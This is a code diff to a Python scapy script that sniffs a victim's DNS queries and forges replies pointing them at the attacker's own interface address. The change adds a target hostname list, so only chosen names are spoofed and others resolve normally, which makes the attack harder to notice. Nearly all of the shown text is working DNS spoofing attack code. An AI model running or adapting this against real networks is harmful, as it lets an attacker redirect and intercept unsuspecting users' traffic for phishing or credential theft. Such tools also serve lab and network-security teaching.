@@ -1,16 +1,18 @@
 from scapy.all import conf, sniff, IP, UDP, DNS, DNSRR, get_if_addr, send, ETH_P_ALL
 from threading import Thread, Event
+import socket
 
 dev = "enp0s8"
 
 class Sniffer(Thread):
-    def  __init__(self, iface, victim):
+    def  __init__(self, iface, victim, hostnames):
         super(Sniffer, self).__init__()
 
         self.socket = None
         self.daemon = True
         self.iface = iface
         self.victim = victim
+        self.hostnames = hostnames
         self.stop_sniffer = Event()
 
     def run(self):
@@ -37,12 +39,21 @@ class Sniffer(Thread):
         ip = packet.getlayer(IP)
         udp = packet.getlayer(UDP)
         dns = packet.getlayer(DNS)
-
+        
         # standard (a record) dns query
         if dns.qr == 0 and dns.opcode == 0:
             queried_host = dns.qd.qname[:-1].decode()
             resolved_ip = get_if_addr(dev)
 
+            # Only spoof certain addresses if not *
+            if self.hostnames != "*":
+                if not queried_host in self.hostnames:
+                    # Uncomment:
+                    #return
+                    # Otherwise, we will return the correct ip address
+                    # For the requested hostname
+                    resolved_ip = socket.gethostbyname(queried_host)
+                    
             if resolved_ip:
                 dns_answer = DNSRR(rrname=queried_host + ".",
                                         ttl=330,
